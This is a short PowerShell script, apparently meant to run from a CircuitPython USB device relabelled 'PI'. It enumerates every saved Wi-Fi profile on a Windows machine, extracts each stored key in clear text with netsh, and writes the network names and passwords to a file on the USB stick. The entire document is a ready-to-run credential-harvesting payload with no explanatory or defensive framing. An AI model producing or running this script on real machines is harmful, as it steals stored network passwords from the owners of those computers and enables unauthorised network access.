# Get the drive letter for CIRCUITPY (remaned to PI)
$drive = (Get-Volume | Where-Object FileSystemLabel -eq 'PI').DriveLetter

# Save the output file to the determined drive
$outputFile = "${drive}:\1.txt"

(netsh wlan show profiles | Select-String -Pattern "All User Profile\s*:" | % { $profile = $_.ToString().Split(":")[1].Trim(); $password = (netsh wlan show profile name="$profile" key=clear | Select-String -Pattern "Key Content\s*:" | % { $_.ToString().Split(":")[1].Trim() }); "$profile : $password" }) | Out-File -encoding utf8 -FilePath $outputFile
